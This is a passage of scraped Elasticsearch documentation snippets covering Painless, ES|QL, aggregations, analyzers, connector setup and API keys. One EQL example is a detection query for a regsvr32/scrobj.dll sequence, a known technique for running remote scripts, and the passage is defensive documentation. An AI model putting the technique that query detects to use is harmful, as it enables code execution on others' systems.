   \"_doc\": {\n      \"properties\": {\n        \"title\": {\n          \"type\": \"text\"\n        },\n        \"content\": {\n          \"type\": \"text\"\n        },\n        \"created_at\": {\n          \"type\": \"date\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Outlook Connector Docker Container\nDESCRIPTION: This shell command runs the Docker container for the Outlook connector, mounting the configuration file and specifying the network and other options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Using Greater Than or Equal Operator in Painless\nDESCRIPTION: Examples of the greater than or equal operator '>=' with different numeric types and def type. Shows type promotion and comparison results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = 5 >= 4;\ndouble y = 6.0;\nx = 6 >= y;\n```\n\nLANGUAGE: painless\nCODE:\n```\nint x = 5;\ndef y = 7.0;\ndef z = y >= 7.0;\ndef a = x >= y;\n```\n\n----------------------------------------\n\nTITLE: Creating an API key for the connector\nDESCRIPTION: This snippet shows how to create an API key for the OneDrive connector using the Elasticsearch Security API.  The API key is configured with cluster privileges and index privileges required for the connector to function correctly.  The response includes an encoded value to use in configuration files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for ESQL String Pattern Matching\nDESCRIPTION: This markdown table specifies the supported input types (str), pattern types, and result types for ESQL's string pattern matching functionality. It shows that both keyword and text types can be matched against keyword patterns, producing boolean results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/not like.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| str | pattern | result |\n| --- | --- | --- |\n| keyword | keyword | boolean |\n| text | keyword | boolean |\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Cluster Administrator in Console\nDESCRIPTION: Demonstrates how to store user-defined metadata in the cluster settings. This example stores an administrator email address under the key 'cluster.metadata.administrator'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/miscellaneous-cluster-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /_cluster/settings\n{\n  \"persistent\": {\n    \"cluster.metadata.administrator\": \"sysadmin@example.com\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Boundary Coordinates Using ESQL Spatial Functions\nDESCRIPTION: This query extracts the minimum and maximum coordinates of Copenhagen's city boundary. It filters airport data for CPH, calculates an envelope around the city boundary, then extracts the minimum and maximum x and y coordinates using spatial functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_ymax.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Converting WKT Points to Cartesian Points in ESQL\nDESCRIPTION: This snippet demonstrates the use of TO_CARTESIANPOINT function to convert Well-Known Text (WKT) Point strings to cartesian_point values. It uses MV_EXPAND to process multiple points and EVAL to apply the conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_cartesianpoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = [\"POINT(4297.11 -1475.53)\", \"POINT(7580.93 2272.77)\"]\n| MV_EXPAND wkt\n| EVAL pt = TO_CARTESIANPOINT(wkt)\n```\n\n----------------------------------------\n\nTITLE: Extended Stats with Runtime Field Calculation\nDESCRIPTION: Demonstrates using a runtime field to perform extended stats aggregation on calculated values, including grade correction using a multiplication factor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-extendedstats-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /exams/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"grade.corrected\": {\n      \"type\": \"double\",\n      \"script\": {\n        \"source\": \"emit(Math.min(100, doc['grade'].value * params.correction))\",\n        \"params\": {\n          \"correction\": 1.2\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"grades_stats\": {\n      \"extended_stats\": { \"field\": \"grade.corrected\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Avoiding PrintWriter.println() for Cross-Platform Compatibility in Java\nDESCRIPTION: This snippet advises against using PrintWriter's println() method due to issues with terminal types on Windows. It recommends using '\\n' for line breaks instead to ensure cross-platform compatibility in tests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/sql-cli/src/forbidden/cli-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\njava.io.PrintWriter#println()\njava.io.PrintWriter#println(java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Date Math Expressions with Datetime on Left (ES|QL)\nDESCRIPTION: This code snippet illustrates a valid date math expression in ES|QL where the datetime function `now()` is positioned on the left side, followed by additions and subtractions of time units.  This is the supported format. The expression calculates a date and time in the future.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_6\n\nLANGUAGE: txt\nCODE:\n```\n\"now() + 1 year - 2hour + ...\"\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Kuromoji Romaji Readingform in Elasticsearch\nDESCRIPTION: This snippet illustrates the use of the _analyze API to test the romaji_analyzer on the Japanese text \"寿司\". It shows the conversion of kanji to romaji reading form.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-readingform.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"romaji_analyzer\",\n  \"text\": \"寿司\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting to Milliseconds\nDESCRIPTION: Demonstrates converting a ZonedDateTime object to milliseconds since epoch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nlong milliSinceEpoch = zdt.toInstant().toEpochMilli();\n```\n\n----------------------------------------\n\nTITLE: Calculating Spatial Centroid in Elasticsearch ESQL\nDESCRIPTION: This SQL query demonstrates the usage of the ST_CENTROID function to calculate the spatial centroid over a field with spatial point geometry type. It is part of an automatically generated test case for Elasticsearch ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/st_centroid_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Rank Evaluation API with Expected Reciprocal Rank Metric\nDESCRIPTION: This snippet shows how to use the Elasticsearch Rank Evaluation API with the Expected Reciprocal Rank metric. It sets the maximum relevance to 3 and the k value to 20.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"JFK query\",\n      \"request\": { \"query\": { \"match_all\": {} } },\n      \"ratings\": []\n    } ],\n  \"metric\": {\n    \"expected_reciprocal_rank\": {\n      \"maximum_relevance\": 3,\n      \"k\": 20\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Using Float Rank Vectors in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a rank_vectors field using float elements and inserting a document with multiple vectors. Each vector contains float values with the same dimensions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-vectors.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-rank-vectors-float\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"rank_vectors\"\n      }\n    }\n  }\n}\n\nPUT my-rank-vectors-float/_doc/1\n{\n  \"my_vector\" : [[0.5, 10, 6], [-0.5, 10, 10]]\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram with Formatted Output Example\nDESCRIPTION: Demonstrates how to format the output of a date histogram value source. This example formats the daily buckets in yyyy-MM-dd format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"date\": {\n              \"date_histogram\": {\n                \"field\": \"timestamp\",\n                \"calendar_interval\": \"1d\",\n                \"format\": \"yyyy-MM-dd\"         <1>\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Croneval Usage Example\nDESCRIPTION: Example showing how to validate a cron expression that runs every minute and display the next 20 execution times.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-croneval.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbin/elasticsearch-croneval \"0 0/1 * * * ?\" -c 20\n```\n\n----------------------------------------\n\nTITLE: Using CHAR_LENGTH Function in Elasticsearch SQL\nDESCRIPTION: Returns the length in characters of the input string. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nCHAR_LENGTH(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CHAR_LENGTH('Elastic');\n\nCHAR_LENGTH('Elastic')\n----------------------\n7\n```\n\n----------------------------------------\n\nTITLE: Configuring Pattern Replace for CamelCase Splitting\nDESCRIPTION: Configuration example for splitting camelCase words by inserting spaces between lowercase and uppercase letters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-replace-charfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"char_filter\": [\n            \"my_char_filter\"\n          ],\n          \"filter\": [\n            \"lowercase\"\n          ]\n        }\n      },\n      \"char_filter\": {\n        \"my_char_filter\": {\n          \"type\": \"pattern_replace\",\n          \"pattern\": \"(?<=\\\\p{Lower})(?=\\\\p{Upper})\",\n          \"replacement\": \" \"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"analyzer\": \"my_analyzer\"\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"The fooBarBaz method\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Cumulative Cardinality Aggregation Syntax\nDESCRIPTION: Shows the basic structure of a cumulative cardinality aggregation that references another cardinality aggregation via buckets_path.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-cardinality-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"cumulative_cardinality\": {\n    \"buckets_path\": \"my_cardinality_agg\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Restricted Java Internal API Packages\nDESCRIPTION: Comprehensive list of internal Java API packages that are restricted from usage in third-party dependencies. These packages are considered non-public internal runtime classes and their usage should be avoided to maintain compatibility and security.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/third-party-audit.txt#2025-04-21_snippet_0\n\nLANGUAGE: properties\nCODE:\n```\n@defaultMessage non-public internal runtime class\ncom.oracle.webservices.internal.**\ncom.oracle.xmlns.internal.**\ncom.sun.activation.registries.**\ncom.sun.browser.**\ncom.sun.corba.se.**\ncom.sun.glass.**\ncom.sun.imageio.**\ncom.sun.istack.internal.**\ncom.sun.javafx.**\ncom.sun.jmx.**\ncom.sun.media.**\ncom.sun.media.sound.**\ncom.sun.naming.internal.**\ncom.sun.openpisces.**\ncom.sun.org.apache.bcel.internal.**\ncom.sun.org.apache.regexp.internal.**\ncom.sun.org.apache.xalan.internal.extensions.**\ncom.sun.org.apache.xalan.internal.lib.**\ncom.sun.org.apache.xalan.internal.res.**\ncom.sun.org.apache.xalan.internal.templates.**\ncom.sun.org.apache.xalan.internal.utils.**\ncom.sun.org.apache.xalan.internal.xslt.**\ncom.sun.org.apache.xalan.internal.xsltc.cmdline.**\ncom.sun.org.apache.xalan.internal.xsltc.compiler.**\ncom.sun.org.apache.xalan.internal.xsltc.trax.**\ncom.sun.org.apache.xalan.internal.xsltc.util.**\ncom.sun.org.apache.xerces.internal.**\ncom.sun.org.apache.xml.internal.res.**\ncom.sun.org.apache.xml.internal.security.**\ncom.sun.org.apache.xml.internal.serializer.utils.**\ncom.sun.org.apache.xml.internal.utils.**\ncom.sun.org.apache.xpath.internal.**\ncom.sun.org.glassfish.**\ncom.sun.pisces.**\ncom.sun.prism.**\ncom.sun.proxy.**\ncom.sun.scenario.**\ncom.sun.t2k.**\ncom.sun.webkit.**\ncom.sun.xml.internal.**\njdk.internal.**\njdk.management.resource.internal.**\njdk.nashorn.internal.**\njdk.nashorn.tools.**\noracle.jrockit.jfr.**\norg.jcp.xml.dsig.internal.**\nsun.**\n```\n\n----------------------------------------\n\nTITLE: Downloading Connector Configuration\nDESCRIPTION: Command to download sample configuration file for Docker deployment\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Using Unicode Case and Case-Insensitive Flags in Painless\nDESCRIPTION: Demonstrates combining Unicode case 'u' and case-insensitive 'i' flags in a Painless regex pattern. This example checks if 'Ɛ' matches 'ɛ' ignoring case.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\n'Ɛ' ==~ /ɛ/iu\n```\n\n----------------------------------------\n\nTITLE: Including SUBSTRING Function Parameters in Markdown\nDESCRIPTION: This snippet uses Markdown syntax to include the parameters section for the SUBSTRING function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/substring.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/substring.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Executing Random Sampler Aggregation in Elasticsearch\nDESCRIPTION: Example query demonstrating how to use the random_sampler aggregation with percentiles calculation on e-commerce data. The query samples 10% of documents (probability: 0.1) and calculates percentiles of the taxful_total_price field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-random-sampler-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET kibana_sample_data_ecommerce/_search?size=0&track_total_hits=false\n{\n  \"aggregations\": {\n    \"sampling\": {\n      \"random_sampler\": {\n        \"probability\": 0.1\n      },\n      \"aggs\": {\n        \"price_percentiles\": {\n          \"percentiles\": {\n            \"field\": \"taxful_total_price\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Text Similarity Reranker with Elastic Rerank Model\nDESCRIPTION: This example shows how to use the text_similarity_reranker retriever with the Elastic Rerank model. It reranks the results from a standard match query based on semantic similarity, considering the top 100 documents and filtering out results with scores below 0.5.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"retriever\": {\n    \"text_similarity_reranker\": {\n      \"retriever\": {\n        \"standard\": {\n          \"query\": {\n            \"match\": {\n              \"text\": \"How often does the moon hide the sun?\"\n            }\n          }\n        }\n      },\n      \"field\": \"text\",\n      \"inference_id\": \"my-elastic-rerank\",\n      \"inference_text\": \"How often does the moon hide the sun?\",\n      \"rank_window_size\": 100,\n      \"min_score\": 0.5\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Formatter Class for String Formatting in Java\nDESCRIPTION: This snippet defines the Formatter class in Java, which is used for formatting strings and creating formatted output. It supports multiple constructors for different output types and locale support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_16\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.Formatter {\n  ()\n  (Appendable)\n  (Appendable,Locale)\n  Formatter format(Locale,String,def[])\n  Formatter format(String,def[])\n  Locale locale()\n  Appendable out()\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Multiplexer Token Filter in Elasticsearch\nDESCRIPTION: This snippet shows how to test the configured multiplexer token filter using the _analyze API. It analyzes the text 'Going HOME' using the custom analyzer with the multiplexer filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-multiplexer-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /multiplexer_example/_analyze\n{\n  \"analyzer\" : \"my_analyzer\",\n  \"text\" : \"Going HOME\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running elasticsearch-setup-passwords with Custom URL in Shell\nDESCRIPTION: Example of using the elasticsearch-setup-passwords command with the auto option and specifying a custom URL for submitting user management API requests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/setup-passwords.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-setup-passwords auto -u \"http://localhost:9201\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Split Processor with Comma Separator and Trailing Preservation in Elasticsearch\nDESCRIPTION: This example shows how to set up the Split processor to split a field using a comma as a separator, while preserving trailing empty fields. This configuration will maintain empty elements at the end of the resulting array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/split-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"split\": {\n    \"field\": \"my_field\",\n    \"separator\": \",\",\n    \"preserve_trailing\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents with Pre-aggregated Data\nDESCRIPTION: Examples of indexing documents containing pre-aggregated metric data with min, max, sum, and value_count values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT stats-index/_doc/1\n{\n  \"agg_metric\": {\n    \"min\": -302.50,\n    \"max\": 702.30,\n    \"sum\": 200.0,\n    \"value_count\": 25\n  }\n}\n\nPUT stats-index/_doc/2\n{\n  \"agg_metric\": {\n    \"min\": -93.00,\n    \"max\": 1702.30,\n    \"sum\": 300.00,\n    \"value_count\": 25\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Completed Reindex Status in Elasticsearch\nDESCRIPTION: This snippet shows the response from the reindex status API after all backing indices have been successfully reindexed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"start_time_millis\": 1737676174349,\n  \"complete\": true,\n  \"total_indices_in_data_stream\": 4,\n  \"total_indices_requiring_upgrade\": 2,\n  \"successes\": 2,\n  \"in_progress\": [],\n  \"pending\": 0,\n  \"errors\": []\n}\n```\n\n----------------------------------------\n\nTITLE: Top Metrics Aggregation with Multiple Field Types\nDESCRIPTION: This example shows how to use top_metrics aggregation with various field types including date, integer, and keyword fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"d\": {\"type\": \"date\"}\n    }\n  }\n}\nPOST /test/_bulk?refresh\n{\"index\": {}}\n{\"s\": 1, \"m\": 3.1415, \"i\": 1, \"d\": \"2020-01-01T00:12:12Z\", \"t\": \"cat\"}\n{\"index\": {}}\n{\"s\": 2, \"m\": 1.0, \"i\": 6, \"d\": \"2020-01-02T00:12:12Z\", \"t\": \"dog\"}\n{\"index\": {}}\n{\"s\": 3, \"m\": 2.71828, \"i\": -12, \"d\": \"2019-12-31T00:12:12Z\", \"t\": \"chicken\"}\nPOST /test/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"tm\": {\n      \"top_metrics\": {\n        \"metrics\": [\n          {\"field\": \"m\"},\n          {\"field\": \"i\"},\n          {\"field\": \"d\"},\n          {\"field\": \"t.keyword\"}\n        ],\n        \"sort\": {\"s\": \"desc\"}\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including MAX Function Examples in Markdown\nDESCRIPTION: This snippet includes the content of a markdown file containing examples of using the MAX function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/max.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/max.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch GCE Discovery for Testing\nDESCRIPTION: Sample configuration for the elasticsearch.yml file required to enable GCE discovery integration tests. The configuration specifies the GCE project ID, zone, and sets GCE as the seed provider.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-testing.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n  gce:\n      project_id: es-cloud\n      zone: europe-west1-a\ndiscovery:\n      seed_providers: gce\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search with Time Constraint in Elasticsearch\nDESCRIPTION: Demonstrates an EQL sequence search with a maximum time span of 1 hour between events using the 'with maxspan' keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence with maxspan=1h\n      [ process where process.name == \"regsvr32.exe\" ]\n      [ file where stringContains(file.name, \"scrobj.dll\") ]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using Quoted Identifiers with Special Characters in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to use quoted identifiers when working with index patterns or names containing special characters that would otherwise clash with SQL syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ip_address FROM \"hosts-*\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Hypotenuse Using HYPOT Function in ESQL\nDESCRIPTION: This example demonstrates using the HYPOT function to calculate the hypotenuse of a right triangle. It creates a row with two values (3.0 and 4.0) representing the sides of a right triangle, then applies HYPOT to calculate the hypotenuse (5.0).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/hypot.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 3.0, b = 4.0\n| EVAL c = HYPOT(a, b)\n```\n\n----------------------------------------\n\nTITLE: SHOW INFO Example\nDESCRIPTION: Example of using SHOW INFO command to retrieve deployment version, build date, and hash information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/show.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nSHOW INFO\n```\n\n----------------------------------------\n\nTITLE: Creating Date Field Mapping for Day of Week Extraction\nDESCRIPTION: This snippet creates an index with a timestamp field of type date, which will be used for extracting the day of the week using a runtime field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"@timestamp\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to define advanced sync rules for an Elasticsearch connector. The JSON structure configures skipping files based on extensions owned by certain users. Ensure proper configuration and syntax for effective rule implementation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"owners\": [\"user1-domain@onmicrosoft.com\", \"user2-domain@onmicrosoft.com\"],\n    \"skipFilesWithExtensions\": [\".py\"]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Method Call on Primitive Type Using Reference Type in Painless\nDESCRIPTION: Demonstrates how to call a method on a primitive type by utilizing its corresponding reference (boxed) type. Shows declaration of an int and calling toString() on it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nint i = 1;    \ni.toString(); \n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Unique Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the analyze API with the unique filter to remove duplicate tokens from a given text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-unique-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"whitespace\",\n  \"filter\" : [\"unique\"],\n  \"text\" : \"the quick fox jumps the lazy fox\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic GCE Discovery Configuration in YAML\nDESCRIPTION: Basic configuration example for setting up GCE discovery in Elasticsearch. Requires specifying the project ID and zone for GCE integration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n  gce:\n    project_id: <your-google-project-id>\n    zone: <your-zone>\ndiscovery:\n  seed_providers: gce\n```\n\n----------------------------------------\n\nTITLE: Converting String to Integer with CONVERT using Standard Type\nDESCRIPTION: Example of using CONVERT with a standard data type (INTEGER) to convert a string to an integer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CONVERT('123', INTEGER) AS int;\n\n      int\n---------------\n123\n```\n\n----------------------------------------\n\nTITLE: SHA256 Function Comment Header\nDESCRIPTION: Auto-generated comment header indicating the file's origin and purpose, warning against manual edits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/sha256.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Lazy Logging in Elasticsearch (Java)\nDESCRIPTION: Demonstrates how to use a Supplier<String> for lazy evaluation of expensive log messages in Elasticsearch, improving performance for rarely seen output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_13\n\nLANGUAGE: java\nCODE:\n```\nlogger.debug(() -> \"rarely seen output [\" + expensiveMethod() + \"]\");\n```\n\n----------------------------------------\n\nTITLE: Defining TextStyle 